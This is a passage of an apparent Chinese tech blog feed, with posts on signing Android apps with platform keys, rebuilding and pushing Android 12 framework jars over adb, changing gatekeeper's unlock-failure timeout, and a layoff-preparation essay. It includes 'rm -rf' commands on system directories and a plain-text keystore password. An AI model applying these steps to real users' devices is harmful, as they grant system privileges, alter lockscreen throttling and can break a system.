class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">单行代码</span><br><span class="line">`create database hero;`</span><br><span class="line"></span><br><span class="line">代码块</span><br><span class="line"> (```)</span><br><span class="line">    function fun()&#123;</span><br><span class="line">         echo &quot;这是一句非常牛逼的代码&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    fun();</span><br><span class="line"> (```)</span><br></pre></td></tr></table></figure><p>效果如下：<br>单行代码<br><code>create database hero;</code></p><p>代码块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function fun()&#123;</span><br><span class="line">     echo &quot;这是一句非常牛逼的代码&quot;;</span><br><span class="line">&#125;</span><br><span class="line">fun();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android系统定制APP开发_如何对应用进行系统签名</title>
      <link href="/2023/02/15/2023-02-15/"/>
      <url>/2023/02/15/2023-02-15/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当项目开发需要使用系统级别权限或frame层某些api时，普通应用是无法使用的，需要在AndroidManifest中配置sharedUserId：<br>AndroidManifest.xml中的android:sharedUserId=”android.uid.system”，代表的意思是和系统相同的uid，可以拥有修改系统时间，文件操作等权限。<br><img src="/images/20230215/20230215171648.png"></p><h3 id="1-制作Android-Studio可以使用的jks文件"><a href="#1-制作Android-Studio可以使用的jks文件" class="headerlink" title="1.制作Android Studio可以使用的jks文件"></a><strong>1.制作Android Studio可以使用的jks文件</strong></h3><p>1.1 下载keytool-importkeypair<br>链接: <a href="https://download.csdn.net/download/u010345983/87453083">https://download.csdn.net/download/u010345983/87453083</a></p><p>1.2 将keytool-importkeypair文件拷贝到platform签名所在目录<br>Android原生的签名会区分user和userdebug，配置目录分别如下：<br>（1）user的签名配置在：build\target\product\security\release<br>（2）userdebug的签名配置在：build\target\product\security<br><img src="/images/20230215/20230215172633.png"><br>签名文件在Android源码的位置如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">build/target/product/security/platform.pk8</span><br><span class="line">build/target/product/security/platform.x509.pem</span><br></pre></td></tr></table></figure><p>其中，.pk8文件为私钥，.x509.pem文件为公钥</p><p>1.3 执行命令生成jks文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./keytool-importkeypair -k longzhiye.jks -p pwd123 -pk8 platform.pk8 -cert platform.x509.pem -alias longzhiye</span><br></pre></td></tr></table></figure><p>-k：生成的jks密钥文件<br>-p：密码<br>-alias：密钥别名</p><h3 id="2-将上述生成的jks文件填到AndroidStudio的build-gradle文件中"><a href="#2-将上述生成的jks文件填到AndroidStudio的build-gradle文件中" class="headerlink" title="2.将上述生成的jks文件填到AndroidStudio的build.gradle文件中"></a><strong>2.将上述生成的jks文件填到AndroidStudio的build.gradle文件中</strong></h3><p>在工程主模块的 <strong>\app\build.gradle</strong>文件中添加 signingConfigs 签名配置信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">android &#123;</span><br><span class="line"></span><br><span class="line">    defaultConfig &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    signingConfigs &#123;</span><br><span class="line">        release &#123;</span><br><span class="line">            storeFile file(&quot;./longzhiye.jks&quot;)</span><br><span class="line">            keyAlias &#x27;longzhiye&#x27;</span><br><span class="line">            keyPassword &#x27;pwd123&#x27;</span><br><span class="line">            storePassword &#x27;pwd123&#x27;</span><br><span class="line">            v2SigningEnabled true</span><br><span class="line">        &#125;</span><br><span class="line">        debug &#123;</span><br><span class="line">            storeFile file(&quot;./longzhiye.jks&quot;)</span><br><span class="line">            keyAlias &#x27;longzhiye&#x27;</span><br><span class="line">            keyPassword &#x27;pwd123&#x27;</span><br><span class="line">            storePassword &#x27;pwd123&#x27;</span><br><span class="line">            v2SigningEnabled true</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    buildTypes &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构建脚本配置完成后，使用Android Studio执行指定的构建时，就会按照我们写好的脚本信息生成对应签名的apk。</p><h3 id="3-密钥安全性"><a href="#3-密钥安全性" class="headerlink" title="3.密钥安全性"></a><strong>3.密钥安全性</strong></h3><p>为了保障密钥的安全， <strong>不建议将密钥文件上传至代码管理平台，也不建议将密钥文件的别名、密码直接以明文的方式写到build.gradle中。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如果你突然被裁员了，你的 Plan B 是什么？</title>
      <link href="/2023/02/09/2023-02-09/"/>
      <url>/2023/02/09/2023-02-09/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>LinkedIn创始人里德霍夫曼(Reid Hoffman)建议每个职场人应该准备3个计划：</p><ul><li><strong>A计划：你的主业，重点是稳定，一份能拿人钱财替人消灾的工作。</strong></li><li><strong>B计划：你的副业，重点是兴趣，8小时外能让你乐于投入其中并且有所收获。</strong></li><li><strong>C计划：你的最后保障，简单来说就是出现重大意外，即使你的主业和副业都失败，仍然可以保障你继续生活。</strong></li></ul><p>王兴曾经说过:<br><strong>2019年是过去10年中最差的一年，也是未来10年中最好的一年。</strong><br>之前我希望王兴预判错了，但现在我发现这位掌控着生活消费类数据的大佬应该没有在扯淡。<br>今年的内部和外部环境真的很糟糕，外部就不说了，内部就说一个点:失业。<br>不要觉得裁员这种事情离你很远，18年年底和19年年初那几波互联网公司裁员潮，20%、30%的裁员力度乃至全项目组砍掉的情况并不鲜见。<br>所以，提前准备吧！准备Plan B 抑或 过冬储备粮都是应有之义。<br>谁知道哪天情况更差，裁员名额就落到你头上呢！</p><h3 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h3><p>这个Plan B怎么做呢？个人给点建议，当然也是本身在践行的。</p><p><strong>第一，减少负债，降低杠杆率。</strong></p><p>如果自身工资不高、家底不厚的，就谨慎购买房产、车子，尽量少用房贷、车贷。<br>那种月收入2万，月供1万的自杀式上车真的很危险，一点风吹草动就会把你打进生活的泥潭。(有朋友对这点有疑惑，我解释下:这里月收入是指家庭月收入，并非你个人的收入，如果你自己月入1万的话，1万的月供不算夸张。当然，我这里只是举个例子，主要是想告诉大家，别把杠杆上的太高，留点安全空间。)</p><p><strong>第二，没本事别创业，搞点副业。</strong></p><p>现在这个大环境下，创业风险还是较高的。如果个人能力不是非常出色，建议还是好好工作。<br>不过，这不代表着消极应对。建议工作不是特别忙的，可以抽出时间来搞点副业。<br>微商、自媒体、淘宝都可以搞，摆地摊也行。<br>说真的，正正当当赚钱，不丢人！</p><p><strong>第三，准备生活保障金。</strong></p><p>定期存生活保障金，具体数额视你的收入而定，10%-30%均可。<br>但需要注意的一点就是：这笔钱除了生活到了无以为继或者重大事项的情况外，比如家人生重病、你或者你老婆失业了，都不可以动用。它和常规意义上的储蓄不同。<br>这是你面对生活的凌辱时，最后一张底牌。</p><p><strong>最后，希望大家都不用动用自己的Plan B，生活能够顺遂一点。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> life </tag>
            
            <tag> feel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 12 编译framewok和services详解</title>
      <link href="/2022/09/09/2022-09-09/"/>
      <url>/2022/09/09/2022-09-09/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Android一直在不断的演进，系统层实现的逻辑也不断的在变化，所以我们还是要不断的学习、跟进，否则一些技术知识就会过时。现在针对<strong>Android 12</strong>的编译步骤详细讲解一下</p><h3 id="1-编译-framework"><a href="#1-编译-framework" class="headerlink" title="1. 编译 framework"></a>1. 编译 framework</h3><h4 id="1-1-编译-framework"><a href="#1-1-编译-framework" class="headerlink" title="1.1 编译 framework"></a>1.1 编译 framework</h4><p>Android 12和之前版本有所区别，此处不能使用make framework -j32 或者mmm framework/base -j32都是不行的，编译命令如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j32 framework-minus-apex</span><br></pre></td></tr></table></figure><p>参考示例：</p><p><img src="/images/20220909/20220909001.png"></p><p>编译完成，输出路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">out\target\product\你的项目名称\system\framework\framework.jar</span><br></pre></td></tr></table></figure><h4 id="1-2-替换-framework-jar"><a href="#1-2-替换-framework-jar" class="headerlink" title="1.2 替换 framework.jar"></a>1.2 替换 framework.jar</h4><p>执行如下命令:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">adb root</span><br><span class="line">adb remount</span><br><span class="line">adb shell &quot;rm -rf /system/framework/arm&quot;</span><br><span class="line">adb push framework.jar /system/framework</span><br><span class="line">adb shell sync</span><br><span class="line">adb reboot</span><br></pre></td></tr></table></figure><p>参考示例：</p><p><img src="/images/20220909/20220909002.png"></p><h3 id="2-编译-services"><a href="#2-编译-services" class="headerlink" title="2. 编译 services"></a>2. 编译 services</h3><p>如果 <strong>frameworks/base/services</strong> 下有修改代码，则要编译services.jar</p><h4 id="2-1-编译-services"><a href="#2-1-编译-services" class="headerlink" title="2.1 编译 services"></a>2.1 编译 services</h4><p>编译命令如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mmm framework/base/services -j32 或者 make -j32 services</span><br></pre></td></tr></table></figure><p>参考示例：</p><p><img src="/images/20220909/20220909003.png"></p><p>编译完成，输出路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">out\target\product\你的项目名称\system\framework\services.jar</span><br></pre></td></tr></table></figure><h4 id="2-2-替换-services-jar"><a href="#2-2-替换-services-jar" class="headerlink" title="2.2 替换 services.jar"></a>2.2 替换 services.jar</h4><p>执行如下命令:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">adb root</span><br><span class="line">adb remount</span><br><span class="line">adb shell &quot;rm -rf /system/framework/arm&quot;</span><br><span class="line">adb push services.jar /system/framework</span><br><span class="line">adb shell &quot;rm -rf /data/dalvik-cache/arm/system@framework@services.jar@classes.* &quot;</span><br><span class="line">adb shell sync</span><br><span class="line">adb reboot</span><br></pre></td></tr></table></figure><p>参考示例：</p><p><img src="/images/20220909/20220909004.png"></p><h3 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h3><p>framework对应的目标文件</p><table><thead><tr><th>编译文件路径</th><th>手机路径</th></tr></thead><tbody><tr><td>out\target\product\xxx\system\framework\framework.jar</td><td>system/framework/</td></tr><tr><td>out\target\product\xxx\system\framework\boot-framework.vdex</td><td>system/framework</td></tr><tr><td>out\target\product\xxx\system\framework\arm\boot-framework.art</td><td>/system/framework/arm</td></tr><tr><td>out\target\product\xxx\system\framework\arm\boot-framework.art.rel</td><td>/system/framework/arm</td></tr><tr><td>out\target\product\xxx\system\framework\arm\boot-framework.oat</td><td>/system/framework/arm</td></tr><tr><td>out\target\product\xxx\system\framework\arm\boot.art</td><td>system/framework/arm/</td></tr><tr><td>out\target\product\xxx\system\framework\arm\boot.oat</td><td>system/framework/arm/</td></tr><tr><td>out\target\product\xxx\system\framework\arm64\boot.art</td><td>system/framework/arm64/</td></tr><tr><td>out\target\product\xxx\system\framework\arm64\boot.oat</td><td>system/framework/arm64/</td></tr><tr><td>out\target\product\xxx\system\framework\arm64\boot-framework.art</td><td>/system/framework/arm64</td></tr><tr><td>out\target\product\xxx\system\framework\arm64\boot-framework.art.rel</td><td>/system/framework/arm64</td></tr><tr><td>out\target\product\xxx\system\framework\arm64\boot-framework.oat</td><td>/system/framework/arm64</td></tr></tbody></table><p>services对应的目标文件</p><table><thead><tr><th>编译文件路径</th><th>手机路径</th></tr></thead><tbody><tr><td>out\target\product\xxx\system\framework\services.jar</td><td>system/framework/</td></tr><tr><td>out\target\product\xxx\system\framework\services.jar.prof</td><td>system/framework</td></tr><tr><td>out\target\product\xxx\system\framework\oat\arm64\services.art</td><td>system/framework/oat/arm64/</td></tr><tr><td>out\target\product\xxx\system\framework\oat\arm64\services.odex</td><td>system/framework/oat/arm64/</td></tr><tr><td>out\target\product\xxx\system\framework\oat\arm64\services.vdex</td><td>system/framework/oat/arm64/</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Android12 </tag>
            
            <tag> 源码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>修改Android 12解锁失败等待时间规则详解</title>
      <link href="/2022/09/08/2022-09-08/"/>
      <url>/2022/09/08/2022-09-08/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>解锁的类型有:Pin码解锁、密码解锁、图案解锁和指纹解锁<br>修改解锁失败的等待时间:做过SystemUI相关模块都知道解锁这一块的验证密码等等操作一般是通过JNI通过Native做的验证操作，数据获取一般也是涉及到C的逻辑。由于考虑其实系统其他的界面功能上也会有解锁的这几种方式，例如：Settings里面的设置解锁方式那里，因此修改锁屏上的解锁等待时间，要修改到共有接口，因此这个功能的添加，并不是这么简单的去修改SystemUI的，但是在网上搜索相关修改等待时间的blog，资料比较少，因此在这把修改的步骤记录下来。</p><p>主要需求有以下3点:<br><strong>1.每次都有5次解锁。<br>2.随着尝试次数的增加，时间增长。<br>3.关机重启后仍然能计算时间。（指纹解锁不需要）</strong></p><h3 id="1-定位修改的起始点"><a href="#1-定位修改的起始点" class="headerlink" title="1.定位修改的起始点"></a>1.定位修改的起始点</h3><p>定位需要修改的地方，尝试使用Layout Inspector获取界面失败了，使用monitor工具，获取如下</p><p><img src="/images/20220908/20220908001.png"></p><p>就可以获取某个控件的id，然后锁定layout布局了，然后就可以找到相关的代码了。</p><h3 id="2-分析整体的修改逻辑"><a href="#2-分析整体的修改逻辑" class="headerlink" title="2.分析整体的修改逻辑"></a>2.分析整体的修改逻辑</h3><p>以此类推，因此我们发现要修改的这几种解锁方式主要分为两大类，两大类为：1、PIN码、密码和图案 2、指纹解锁</p><p>分为两大类的主要原因是因为指纹解锁的主要逻辑并不在Keyguard里面而是<strong>SystemUI</strong>模块里面，因为在<strong>Android 7.0</strong>的代码上Keyguard和SystemUI是分开的，Android 12则合到了一起。</p><h3 id="3-具体修改的实现"><a href="#3-具体修改的实现" class="headerlink" title="3.具体修改的实现"></a>3.具体修改的实现</h3><p>修改PIN码、密码和图案解锁</p><p>通过上面的工具定位代码得知，相关类如下：</p><p><img src="/images/20220908/20220908002.png"></p><p>如图，其实相关类为<strong>KeyguardPINView、KeyguardPassworkView</strong>和<strong>KeyguardPatternView</strong></p><p>这几个就是PIN码、密码和图案对应的自定义View，而其中的点击并操作的逻辑也是在这里面，感觉根据MVC的设计原则，感觉有点不符合这点啊哈哈哈。。。结果View和Model放到一起了。</p><p>其实为什么PIN码和密码放到一起呢？因为他们有个共同的父类<strong>KeyguardAbsKeyInputView.java</strong>,关于解锁逻辑的显示控制也在父类里，因此PIN码和密码解锁在这个父类里做操作就可以了。</p><p><strong>com.android.keyguard.KeyguardAbsKeyInputViewController.java</strong>其中代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">new LockPatternChecker.OnCheckCallback() &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void onEarlyMatched() &#123;</span><br><span class="line">        mLatencyTracker.onActionEnd(ACTION_CHECK_CREDENTIAL);</span><br><span class="line"></span><br><span class="line">        onPasswordChecked(userId, true /* matched */, 0 /* timeoutMs */,</span><br><span class="line">                true /* isValidPassword */);</span><br><span class="line">        password.zeroize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void onChecked(boolean matched, int timeoutMs) &#123;</span><br><span class="line">        mLatencyTracker.onActionEnd(ACTION_CHECK_CREDENTIAL_UNLOCKED);</span><br><span class="line">        mView.setPasswordEntryInputEnabled(true);</span><br><span class="line">        mPendingLockCheck = null;</span><br><span class="line">        if (!matched) &#123;</span><br><span class="line">            onPasswordChecked(userId, false /* matched */, timeoutMs,</span><br><span class="line">                    true /* isValidPassword */);</span><br><span class="line">        &#125;</span><br><span class="line">        password.zeroize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void onCancelled() &#123;</span><br><span class="line">        // We already got dismissed with the early matched callback, so we cancelled</span><br><span class="line">        // the check. However, we still need to note down the latency.</span><br><span class="line">        mLatencyTracker.onActionEnd(ACTION_CHECK_CREDENTIAL_UNLOCKED);</span><br><span class="line">        password.zeroize();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实关于锁屏PIN码、密码和图案解锁都是依靠这个<strong>LockPatternChecker.checkPassword</strong>方法去验证密码，然后利用<strong>LockPatternChecker.OnCheckCallback</strong>这个回调来返回验证结果，这个验证结果的回调也是通过JNI一系列步骤完成的。</p><p>先看其中的两个回调方法</p><p>1、onChecked 这个回调方法是当验证失败的时候才会回调，这里会返回matched，这里会返回false，timeoutMs这里就是时间间隔。</p><p>2、onEarlyMatched 这个回调方法是当验证成功的时候才会回调。</p><p>发现问题：</p><p>其实刚开始做这个功能的时候并没有考虑做全局的，就想在这里做一个时间的拦截，然后自己把这个时间间隔改了，就能完成需求，其实后来测试并不行，所以这里就牵扯出了发现的几个问题。</p><p>经测试发现，如下问题：</p><p>1、系统默认返回都是30×1000</p><p>2、默认锁屏第三次尝试解锁时候，并不是5次。</p><p>3、就算你强制能让第三次尝试的还能输入密码尝试解锁，但是系统下边是锁定的，并不能进行正常的解锁尝试（即输入的正常密码，并不能解锁成功，返回仍然是失败）</p><p>因此，根据需求要做成全局的，就找到根源把这个返回时间修改成自己想要的这样，所有实现这个回调的应用都能获取到新制定规则的时间（这里是指Settings（其实每个应用）那边其实也是实现这边的回调接口，然后系统返回这个时间都能接受到最新的时间规则）。</p><p>这样就一直追，追到了这个类<strong>gatekeeper.cpp</strong>。（其实做系统开发，修改或者添加功能，就是找到一个突破口，一直追追）其实真正的返回时间的是在这里写好的。如下：</p><p><strong>/system/gatekeeper/gatekeeper.cpp</strong> 的ComputeRetryTimeout函数</p><p>原生代码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * Calculates the timeout in milliseconds as a function of the failure</span><br><span class="line"> * counter &#x27;x&#x27; as follows:</span><br><span class="line"> *</span><br><span class="line"> * [0, 4] -&gt; 0</span><br><span class="line"> * 5 -&gt; 30</span><br><span class="line"> * [6, 10] -&gt; 0</span><br><span class="line"> * [11, 29] -&gt; 30</span><br><span class="line"> * [30, 139] -&gt; 30 * (2^((x - 30)/10))</span><br><span class="line"> * [140, inf) -&gt; 1 day</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line">uint32_t GateKeeper::ComputeRetryTimeout(const failure_record_t *record) &#123;</span><br><span class="line">    static const int failure_timeout_ms = 30000;</span><br><span class="line">    if (record-&gt;failure_counter == 0) return 0;</span><br><span class="line"></span><br><span class="line">    if (record-&gt;failure_counter &gt; 0 &amp;&amp; record-&gt;failure_counter &lt;= 10) &#123;</span><br><span class="line">        if (record-&gt;failure_counter % 5 == 0) &#123;</span><br><span class="line">            return failure_timeout_ms;</span><br><span class="line">        &#125;  else &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else if (record-&gt;failure_counter &lt; 30) &#123;</span><br><span class="line">        return failure_timeout_ms;</span><br><span class="line">    &#125; else if (record-&gt;failure_counter &lt; 140) &#123;</span><br><span class="line">        return failure_timeout_ms &lt;&lt; ((record-&gt;failure_counter - 30) / 10);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return DAY_IN_MS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据上边可以看出，30000这个数字很敏感嘛，系统一直返回的就是这个30000ms，终于找到了，是一个固定值。其实细看这个方法可以看出来，它是通过记录失败的次数然后进行了判断，返回时间间隔。</p><p>总结上边代码：</p><p>1、当失败0次，返回0ms</p><p>2、当失败大于0，失败小于10次，就是当前两次时，每次失败5次后，返回30000ms，意思是这总前两次都可以尝试5次机会</p><p>3、当失败次数小于30次，就是当总次数是10次到30次时，返回30000ms，意思是第二次以后为每次就只有一次尝试机会解锁，就要等待时间。直到总次数为30次时。</p><p>4、当总次数大于30次到140次，就是需要左移运算出毫秒数。</p><p>这里有两种次数，一种是每次解锁都有5次尝试机会（但是只有前两次），后边每次都要等待时间，这里就是前边我们遇到的问题。</p><p>因此修改这个方法的规则，解决问题</p><p>修改后代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">uint32_t GateKeeper::ComputeRetryTimeout(const failure_record_t *record) &#123;</span><br><span class="line">    static const int failure_timeout_ms = 60*1000;</span><br><span class="line">    if (record-&gt;failure_counter == 0) return 0;</span><br><span class="line">    if (record-&gt;failure_counter &gt; 0) &#123;</span><br><span class="line">        if (record-&gt;failure_counter % 5 == 0) &#123;</span><br><span class="line">                if(record-&gt;failure_counter/5 == 1)&#123;</span><br><span class="line">                    return 2*failure_timeout_ms;</span><br><span class="line">                &#125;else if(record-&gt;failure_counter/5 == 2)&#123;</span><br><span class="line">                    return 5*failure_timeout_ms;</span><br><span class="line">                &#125;else if(record-&gt;failure_counter/5 == 3)&#123;</span><br><span class="line">                    return 15*failure_timeout_ms;</span><br><span class="line">                &#125;else if(record-&gt;failure_counter/5 == 4)&#123;</span><br><span class="line">                    return 30*failure_timeout_ms;</span><br><span class="line">                &#125;else if(record-&gt;failure_counter/5 == 5)&#123;</span><br><span class="line">                    return 60*failure_timeout_ms;</span><br><span class="line">                &#125;else if(record-&gt;failure_counter/5 &gt;= 6)&#123;</span><br><span class="line">                    return 120*failure_timeout_ms;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;  else &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 2*failure_timeout_ms;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，我们就修改了它原生的规则。实现时间的动态改变，随着尝试次数的增加。</p><p>写到这已经满足了需求上的前两条需求了，现在就要满足实现第三条关机重启仍然能计算时间。</p><p>根据逻辑如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">void onPasswordChecked(int userId, boolean matched, int timeoutMs, boolean isValidPassword) &#123;</span><br><span class="line">    boolean dismissKeyguard = KeyguardUpdateMonitor.getCurrentUser() == userId;</span><br><span class="line">    if (matched) &#123;</span><br><span class="line">        getKeyguardSecurityCallback().reportUnlockAttempt(userId, true, 0);</span><br><span class="line">        if (dismissKeyguard) &#123;</span><br><span class="line">            mDismissing = true;</span><br><span class="line">            mLatencyTracker.onActionStart(LatencyTracker.ACTION_LOCKSCREEN_UNLOCK);</span><br><span class="line">            getKeyguardSecurityCallback().dismiss(true, userId);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        if (isValidPassword) &#123;</span><br><span class="line">            getKeyguardSecurityCallback().reportUnlockAttempt(userId, false, timeoutMs);</span><br><span class="line">            if (timeoutMs &gt; 0) &#123;</span><br><span class="line">                long deadline = mLockPatternUtils.setLockoutAttemptDeadline(</span><br><span class="line">                        userId, timeoutMs);</span><br><span class="line">                handleAttemptLockout(deadline);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (timeoutMs == 0) &#123;</span><br><span class="line">            mMessageAreaController.setMessage(mView.getWrongPasswordStringId());</span><br><span class="line">        &#125;</span><br><span class="line">        mView.resetPasswordText(true /* animate */, false /* announce deletion if no match */);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实这里就是上边说的回调接口调用的方法，来处理验证密码失败或者成功的逻辑，其中上边逻辑处理成功就是matched为true的时候，失败为false的时候，因此看false这边通过这句代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">long deadline = mLockPatternUtils.setLockoutAttemptDeadline(</span><br><span class="line">                                userId, timeoutMs);</span><br></pre></td></tr></table></figure><p>设置了时间，然后返回一个终止时间（就是计时结束的时间戳），然后去实现倒计时处理的。</p><p>来看一下，这个方法是怎么记录时间戳的？</p><p><code>/frameworks/base/core/java/com/android/internal/widget/LockPatternUtils.java</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">* Set and store the lockout deadline, meaning the user can&#x27;t attempt their unlock</span><br><span class="line">* pattern until the deadline has passed.</span><br><span class="line">* @return the chosen deadline.</span><br><span class="line">*/</span><br><span class="line">@UnsupportedAppUsage</span><br><span class="line">public long setLockoutAttemptDeadline(int userId, int timeoutMs) &#123;</span><br><span class="line">    final long deadline = SystemClock.elapsedRealtime() + timeoutMs;</span><br><span class="line">    if (userId == USER_FRP) 